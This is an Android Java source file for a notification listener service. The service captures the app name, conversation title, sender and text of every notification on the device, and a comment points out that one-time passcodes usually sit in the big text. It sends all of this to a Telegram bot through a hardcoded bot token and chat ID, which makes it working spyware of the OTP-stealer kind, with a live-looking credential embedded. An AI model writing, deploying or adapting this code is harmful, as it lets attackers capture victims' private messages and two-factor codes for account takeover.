package com.example.notificationbridge;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class NotificationListener extends NotificationListenerService {

    private static final String TAG = "NotifBridge";
    // 👇 PUT YOUR TELEGRAM BOT TOKEN AND CHAT ID HERE
    private static final String BOT_TOKEN = "8784269795:AAH6CMkTyR8N9h49DaRSpi-HmfVTLmvG_0I ";
    private static final String CHAT_ID = "748395295";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            Notification n = sbn.getNotification();
            Bundle ex = n.extras;

            CharSequence title = ex.getCharSequence(Notification.EXTRA_TITLE);
            CharSequence text  = ex.getCharSequence(Notification.EXTRA_TEXT);
            CharSequence big   = ex.getCharSequence(Notification.EXTRA_BIG_TEXT);
            CharSequence sub   = ex.getCharSequence(Notification.EXTRA_SUBTITLE);
            CharSequence convo = ex.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE);

            // take the longest available text (OTP is usually in big text)
            CharSequence body = text;
            if (big != null && (body == null || big.length() > body.length())) body = big;

            // skip empty and silent/self notifications
            if (body == null || body.length() == 0) {
                Log.i(TAG, "Skipped (no text): " + sbn.getPackageName());
                return;
            }

            String msg = "📱 App: " + sbn.getPackageName() + "\n"
                    + (convo != null ? "💬 Chat: " + convo + "\n" : "")
                    + (sub != null ? "👤 " + sub + "\n" : "")
                    + "🔔 " + (title != null ? title : "") + "\n"
                    + body;

            sendToTelegram(msg);
        } catch (Exception e) {
            Log.e(TAG, "onNotificationPosted failed", e);
        }
    }

    private void sendToTelegram(String message) {
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                String body = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8")
                        + "&text=" + URLEncoder.encode(message, "UTF-8");

                conn = (HttpURLConnection) new URL(urlStr).openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(body.getBytes(StandardCharsets.UTF_8));
                }
                Log.i(TAG, "Telegram response: " + conn.getResponseCode());
            } catch (Exception e) {
                Log.e(TAG, "Telegram send failed", e);
            } finally {
                if (conn != null) conn.disconnect();
            }
        }).start();
    }
}
